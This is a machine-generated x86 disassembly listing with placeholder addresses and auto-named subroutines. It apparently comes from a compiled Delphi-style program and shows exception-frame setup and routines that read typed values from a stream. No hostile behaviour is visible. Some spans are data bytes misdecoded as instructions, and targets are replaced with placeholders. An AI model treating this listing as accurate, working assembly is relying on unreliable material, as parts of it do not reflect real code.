mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403254
sub_41dbb8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41dc9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f728
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41dc72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41dca3
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41db58
pop ecx
test al al
jne r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a08
sub_41dcc8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41dd40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403450
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_41a11c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41dd45
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41db58
pop ecx
test al al
jne r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a08
sub_41dd68
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41dde3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f728
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403450
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41dde8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41db58
pop ecx
test al al
jne r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a08
sub_41de0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41e02d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41f0b8
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41f0b8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41dffd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41dfbb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41da58
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41dad0
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41dbb8
pop ecx
push ebp
call sub_41dd68
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41dcc8
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a8c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41dad0
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41dad0
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e034
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405328
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403450
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a62c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41da1c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a474
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41da1c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a474
sub_41dfc0
push ebp
call sub_41db38
pop ecx
test al al
je r-xdata
call sub_403a08
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403254
sub_41e048
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e0b8
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41e0a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e0b8
mov eax [ ebp - 0x4 ]
call sub_41d608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d74c
retn
sub_41e0b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d4f0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e5c0
mov eax [ ebp - 0x4 ]
call sub_41e45c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403450
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41e17a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403450
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d4f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41de0c
mov eax [ ebp - 0x4 ]
call sub_41e45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e181
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41e188
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41f294
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e410
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41d858
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41e1cc
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41f294
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e410
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d858
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41e210
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41f294
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e410
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d858
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41e260
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41f294
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41e410
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d858
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41e2a4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41f294
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41d330
mov al [ eax + lookup_table_41e2cb ]
jmp [ eax * 4 + jump_table_41e2d9 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d858
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404094
mov eax esi
call j_sub_404470#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d858
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41e3a4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41f294
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d858
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41d858
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d858
jmp r-xdata
jmp r-xdata
call sub_41d330
sub_41e410
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d834
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41e3a4
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41f294
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d858
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41e464
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41d834
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41f294
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41e3a4
mov [ edi ] eax
sub_41e4a1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e595
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403fa4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40403c
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e59c
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404208
sub_41e5c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e790
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403820#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41f0b8
xor edx edx
push ebp
push j_sub_403820#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404264
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4044c4
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403494
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_416a44
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403494
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_416a44
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e944
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41d844
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_416aec
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41e5a4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e797
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edi ebx
jmp r-xdata
sub_41e74a
add [ eax ] eax
add [ eax ] al
sbb al 0x74
inc eax
add [ esi - 0x19 ] dl
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a08
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e797
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_41e7a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_419fc4
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d330
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416b60
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e7e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cdc4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a474
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e828
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41e877
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f9ac
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e87e
lea eax [ ebp - 0x10 ]
call sub_40f564
retn
sub_41e884
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41e936
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d834
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e2a4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cdc4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41a474
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f294
lea eax [ ebp - 0x4 ]
call sub_405a08
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_417724
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e93d
lea eax [ ebp - 0x8 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_41e944
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ec3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec46
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x24 ]
call sub_4046b0
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc8
retn
jmp [ eax * 4 + jump_table_41e9d4 ]
mov eax [ rw-data ]
call sub_41d318
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416aec
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d834
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8f4
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416b60
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41e2a4
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4169e0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416b60
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e188
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4173fc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41f0f4
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4170fc
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41f1b0
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417210
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41efd8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416b60
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d834
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d834
cmp al 0xd
jne r-xdata
push ebp
call sub_41e828
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e410
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176e8
jmp r-xdata
push ebp
call sub_41e884
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416aec
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3a4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416b60
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e2a4
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e7a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f294
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416b60
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41e2a4
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f294
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417688
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f294
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416aec
mov edx eax
mov eax [ ebp - 0x4 ]
